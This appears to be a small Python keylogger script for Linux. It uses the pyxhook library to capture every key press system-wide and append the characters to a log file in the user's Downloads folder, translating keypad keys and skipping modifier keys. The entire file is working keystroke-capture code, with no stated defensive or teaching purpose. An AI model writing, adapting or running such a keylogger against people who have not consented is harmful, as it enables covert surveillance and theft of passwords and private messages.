# import needed modules
import os
from datetime import datetime
import pyxhook

def main():
    # Specify the name of the file (can be changed )
    log_file = f'/home/user/Downloads/keypress.log'

    # The logging function with {event parm}
    def OnKeyPress(event):

        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
            if event.Key == 'P_Enter' :
                f.write('\n')
            elif  event.Key == 'P_End' :
                f.write('1')
            elif  event.Key == 'P_Down' :
                f.write('2')
            elif  event.Key == 'P_Next' :
                f.write('3')
            elif  event.Key == 'P_Left' :
                f.write('4')
            elif  event.Key == 'P_Begin' :
                f.write('5')
            elif  event.Key == 'P_Right' :
                f.write('6')
            elif  event.Key == 'P_Home' :
                f.write('7')
            elif  event.Key == 'P_Up' :
                f.write('8')
            elif  event.Key == 'P_Page_Up' :
                f.write('9')
            elif  event.Key == 'Shift_R' :
                pass
            elif  event.Key == 'Shift_L' :
                pass
            elif  event.Key == 'Tab' :
                f.write('Tab')
            elif  event.Key == 'BackSpace' :
                f.write('del')
            elif  event.Key == 'Caps_Lock' :
                pass
            elif event.Key == '[65027]':
                pass
            else:
                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters

    # Create a hook manager object
    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = OnKeyPress

    new_hook.HookKeyboard()  # set the hook

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        # User cancelled from command line so close the listener
        new_hook.cancel()
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")


if __name__ == "__main__":
    main()